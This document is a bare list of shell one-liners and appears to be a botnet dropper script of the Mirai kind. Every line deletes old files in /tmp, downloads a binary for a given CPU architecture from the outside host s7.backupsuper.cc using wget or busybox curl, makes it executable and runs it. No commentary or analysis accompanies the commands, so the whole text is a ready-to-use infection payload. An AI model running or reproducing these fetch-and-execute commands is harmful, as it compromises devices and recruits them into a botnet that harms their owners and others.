cd /tmp | cd ~; rm -rf /tmp/arm; wget http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm multi-arm
cd /tmp | cd ~; rm -rf /tmp/arm5; wget http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 multi-arm5
cd /tmp | cd ~; rm -rf /tmp/arm6; wget http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 multi-arm6
cd /tmp | cd ~; rm -rf /tmp/arm7; wget http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 multi-arm7
cd /tmp | cd ~; rm -rf /tmp/debug.dbg; wget http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg multi-debug
cd /tmp | cd ~; rm -rf /tmp/m68k; wget http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k multi-m68k
cd /tmp | cd ~; rm -rf /tmp/mips; wget http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips multi-mips
cd /tmp | cd ~; rm -rf /tmp/ppc; wget http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc multi-ppc
cd /tmp | cd ~; rm -rf /tmp/sh4; wget http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 multi-sh4
cd /tmp | cd ~; rm -rf /tmp/spc; wget http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc multi-spc
cd /tmp | cd ~; rm -rf /tmp/x86; wget http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 multi-x86
cd /tmp | cd ~; rm -rf /tmp/x86_64; wget http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 multi-x86_64
cd /tmp | cd ~; rm -rf /tmp/bot.mpsl; wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl multi_bot_mpsl


cd /tmp | cd ~; rm -rf /tmp/arm;/bin/busybox wget http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm multi2-arm
cd /tmp | cd ~; rm -rf /tmp/arm5;/bin/busybox wget http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 multi2-arm5
cd /tmp | cd ~; rm -rf /tmp/arm6;/bin/busybox wget http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 multi2-arm6
cd /tmp | cd ~; rm -rf /tmp/arm7;/bin/busybox wget http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 multi2-arm7
cd /tmp | cd ~; rm -rf /tmp/debug.dbg;/bin/busybox wget http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg multi2-debug
cd /tmp | cd ~; rm -rf /tmp/m68k;/bin/busybox wget http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k multi2-m68k
cd /tmp | cd ~; rm -rf /tmp/mips;/bin/busybox wget http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips multi2-mips
cd /tmp | cd ~; rm -rf /tmp/ppc;/bin/busybox wget http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc multi2-ppc
cd /tmp | cd ~; rm -rf /tmp/sh4;/bin/busybox wget http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 multi2-sh4
cd /tmp | cd ~; /bin/busybox wget http://s7.backupsuper.cc/gfdsggfdsgfdsgfds.mpsl; chmod 777 gfdsggfdsgfdsgfds.mpsl; ./gfdsggfdsgfdsgfds.mpsl rand-multi.mpsl
cd /tmp | cd ~; rm -rf /tmp/spc;/bin/busybox wget http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc multi2-spc
cd /tmp | cd ~; rm -rf /tmp/x86;/bin/busybox wget http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 multi2-x86
cd /tmp | cd ~; rm -rf /tmp/x86_64;/bin/busybox wget http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 multi2-x86_64
cd /tmp | cd ~; rm -rf /tmp/bot.mpsl;/bin/busybox wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl multi2_bot_mpsl
















cd /tmp | cd ~; rm -rf /tmp/arm;busybox curl http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm mult1-arm
cd /tmp | cd ~; rm -rf /tmp/arm5;busybox curl http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 mult1-arm5
cd /tmp | cd ~; rm -rf /tmp/arm6;busybox curl http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 mult1-arm6
cd /tmp | cd ~; rm -rf /tmp/arm7;busybox curl http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 mult1-arm7
cd /tmp | cd ~; rm -rf /tmp/debug.dbg;busybox curl http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg mult1-debug
cd /tmp | cd ~; rm -rf /tmp/m68k;busybox curl http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k mult1-m68k
cd /tmp | cd ~; rm -rf /tmp/mips;busybox curl http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips mult1-mips
cd /tmp | cd ~; rm -rf /tmp/ppc;busybox curl http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc mult1-ppc
cd /tmp | cd ~; rm -rf /tmp/sh4;busybox curl http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 mult1-sh4
cd /tmp | cd ~; busybox curl http://s7.backupsuper.cc/gfdsggfdsgfdsgfds.mpsl; chmod 777 gfdsggfdsgfdsgfds.mpsl; ./gfdsggfdsgfdsgfds.mpsl rand-multi1.mpsl
cd /tmp | cd ~; rm -rf /tmp/spc;busybox curl http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc mult1-spc
cd /tmp | cd ~; rm -rf /tmp/x86;busybox curl http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 mult1-x86
cd /tmp | cd ~; rm -rf /tmp/x86_64;busybox curl http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 mult1-x86_64
cd /tmp | cd ~; rm -rf /tmp/bot.mpsl;busybox curl http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl mult1_bot_mpsl

cd /tmp | cd ~; rm -rf /tmp/mpsl;busybox curl http://s7.backupsuper.cc/mpsl; chmod 777 mpsl; /bin/busybox ./mpsl mult1_bot_mpsl2
busybox curl http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; /bin/busybox ./bot.mpsl mult1_bot_mpsl3



cd /tmp | cd ~; rm -rf /tmp/arm;wget http://s7.backupsuper.cc/arm; chmod 777 arm; ./arm mult2-arm
cd /tmp | cd ~; rm -rf /tmp/arm5;wget http://s7.backupsuper.cc/arm5; chmod 777 arm5; ./arm5 mult2-arm5
cd /tmp | cd ~; rm -rf /tmp/arm6;wget http://s7.backupsuper.cc/arm6; chmod 777 arm6; ./arm6 mult2-arm6
cd /tmp | cd ~; rm -rf /tmp/arm7;wget http://s7.backupsuper.cc/arm7; chmod 777 arm7; ./arm7 mult2-arm7
cd /tmp | cd ~; rm -rf /tmp/debug.dbg;wget http://s7.backupsuper.cc/debug.dbg; chmod 777 debug.dbg; ./debug.dbg mult2-debug
cd /tmp | cd ~; rm -rf /tmp/m68k;wget http://s7.backupsuper.cc/m68k; chmod 777 m68k; ./m68k mult2-m68k
cd /tmp | cd ~; rm -rf /tmp/mips;wget http://s7.backupsuper.cc/mips; chmod 777 mpsl; ./mips mult2-mips
cd /tmp | cd ~; rm -rf /tmp/ppc;wget http://s7.backupsuper.cc/ppc; chmod 777 ppc; ./ppc mult2-ppc
cd /tmp | cd ~; rm -rf /tmp/sh4;wget http://s7.backupsuper.cc/sh4; chmod 777 sh4; ./sh4 mult2-sh4
cd /tmp | cd ~; wget http://s7.backupsuper.cc/gfdsggfdsgfdsgfds.mpsl; chmod 777 gfdsggfdsgfdsgfds.mpsl; ./gfdsggfdsgfdsgfds.mpsl rand-multi2.mpsl
cd /tmp | cd ~; rm -rf /tmp/spc;wget http://s7.backupsuper.cc/spc; chmod 777 spc; ./spc mult2-spc
cd /tmp | cd ~; rm -rf /tmp/x86;wget http://s7.backupsuper.cc/x86; chmod 777 x86; ./x86 mult2-x86
cd /tmp | cd ~; rm -rf /tmp/x86_64;wget http://s7.backupsuper.cc/x86_64; chmod 777 x86_64; ./x86_64 mult2-x86_64
cd /tmp | cd ~; rm -rf /tmp/bot.mpsl;wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; ./bot.mpsl mult2_bot_mpsl

cd /tmp | cd ~; rm -rf /tmp/mpsl;wget http://s7.backupsuper.cc/mpsl; chmod 777 mpsl; /bin/busybox ./mpsl mult2_bot_mpsl2
wget http://s7.backupsuper.cc/bot.mpsl; chmod 777 bot.mpsl; /bin/busybox ./bot.mpsl mult2_bot_mpsl3
